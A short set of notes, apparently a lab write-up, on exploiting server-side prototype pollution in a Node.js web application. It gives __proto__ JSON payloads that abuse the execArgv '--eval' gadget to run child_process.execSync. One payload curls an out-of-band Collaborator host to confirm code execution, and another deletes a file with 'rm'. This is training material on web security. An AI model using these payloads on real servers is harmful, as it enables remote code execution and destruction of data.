/*

because it unsafely merges user-controllable input into a server-side JavaScript object.

 To solve the lab:

a) Find a pp source that you can use to add arbitrary properties to the global Object.prototype
b) Identify a gadget that you can use to inject and execute arbitrary system commands
c) Trigger remote execution of a command that deletes the file /home/carlos/morale.txt


1) POST /my-account/change-address
// send to repeater



2) Identify a PP source
// use _proto_ property with an object with a json spaces property
"__proto__": {
    "json spaces":10
}


{
    "address_line_1":"Wiener HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"OKUdDMCmuFqWSoTKsVzz8QH9km3ZOhrJ"
    "__proto__": {
    "json spaces":10
}}


3) Probe for remote code execution

"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}

// execArgv property
// --eval argument, enables to pass in arbitrary JS that will be executed by the child process
    of methods like Methods such as child_process.spawn() and child_process.fork()

// In addition to fork(), the child_process module contains the execSync() 
    method, which executes an arbitrary string as a system command.



4) Craft an exploit
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}    


//Within the execArgv array, there is a single element, which is a string.


*/